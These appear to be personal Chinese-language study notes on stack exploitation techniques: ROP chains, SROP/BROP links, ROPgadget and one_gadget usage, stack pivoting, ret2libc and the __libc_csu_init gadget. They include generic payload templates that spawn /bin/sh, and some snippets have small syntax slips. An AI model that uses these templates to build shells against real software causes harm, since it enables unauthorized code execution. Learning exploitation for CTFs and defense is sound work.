## brop

http://www.scs.stanford.edu/brop/

## srop

https://www.freebuf.com/articles/network/87447.html
https://blog.csdn.net/qq_29343201/article/details/72627439

## ROPgadget

1.  ROPgadget 得到代码片断
2.  cd80c3 就是 int0x80;ret,s 使用`ROPgadget --binary {binaryname} --opcode cd80c3`来寻找
3.  动态链接找不到 int 0x80,需要构造 rop
4.  `ROPgadget --binary {binary_name} --ropchain`可以直接生成 ROP chain，不过要转换一下

```py
rop = []
# i = 1
for line in open("ropc"):
    # print line,
    if "pack" in line and '+=' in line:
        print line
        # print i
        # print str(line).split(", ")[1].split(")")[0]
        rop.append(str(line).split(", ")[1].split(")")[0])
    if 'pack' not in line and '+=' in line:
        # print i
        # print line
        rop.append(str(line).split("+= ")[1][1:-2])
    # i += 1
i=0
while(i<len(rop)):
    if rop[i]=='/bin':
        rop[i]='0x6e69622f'
    if rop[i]=='sh':
        rop[i]='0x68732f2f'
    i+=1
print rop
```

## one_gadget

https://github.com/david942j/one_gadget

直接从 glibc 里 getshell 的函数。

### 寄存器赋值

构造栈结构

```
  *(pop eax ;ret)
  3
```

将 eax 赋值为 3

### 栈转移

寻找 leave;ret;指令，然后更改 ebp 的值即可

```py
payload += p32(base_stage)
payload += p32(leave_ret)
#leave= mov esp,ebp,pop ebp
```

例子：将 esp 设置到 bss 段上

```py
payload = flat(
  [
  'A' * offset, # 覆盖到ret
  read_plt, # 读100个字节到base_stage
  ppp_ret, # pop esi ; pop edi ; pop ebp ; ret 清空参数
  0,
  base_stage,
  100,
  pop_ebp_ret, # 把base_stage pop到ebp中
  base_stage,
  leave_ret  #mov esp,ebp;pop ebp
  ]
)
cmd = "/bin/sh"
payload1= flat(
  [
    'A' *4 # 接payload1，ebp='AAAA'
    write_plt
    #...
  ]
)
```

## 通用技术

常用的栈布局如下

```py
# 32位
flat(
    [
    read_addr,
    system_addr,
    0, #read 函数一个参数 fd/system返回地址
    binsh_addr #read第二个参数/system第一个参数
    ]
)

flat([
        gets,
        system,
        buf,
        buf
        ])
# 64位
flat(
    [
        pop_edi,
        0, //read第一个参数 fd
        pop_rsi,
        binsh_addr, #read第二个参数 sh字符串地址
        pop_rdx,
        20,      #read第三个参数 长度
        read_addr,
        pop_rdi,
        binsh_addr,# system第一个参数
        system_addr,
    ]
)
```

## ret2libc

64 下通用 gadget,`__libc_csu_init`,一共两端代码，可以设置三个寄存器传参的值

```asm
;第一段代码gad1
  pop     rbx  ;必须为0
  pop     rbp  ;必须为1
  pop     r12  ;你call函数的地址(应该是got上的?)
  pop     r13  ;arg3
  pop     r14  ;arg2
  pop     r15  ;arg1
  retn         ;gad2
```

```asm
;第二段代码gad2
mov     rdx, r13
mov     rsi, r14
mov     edi, r15d
call    qword ptr [r12+rbx*8] call!!!
add     rbx, 1
cmp     rbx, rbp
jnz     short loc_400880
add     rsp, 8
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15 ;这个地方可以构造错位gadgets,恰好可以构造为pop rdi,ret
retn     ;构造一些垫板(7*8=56byte)，因为后面后面还有很多pop+rbp+ret
```
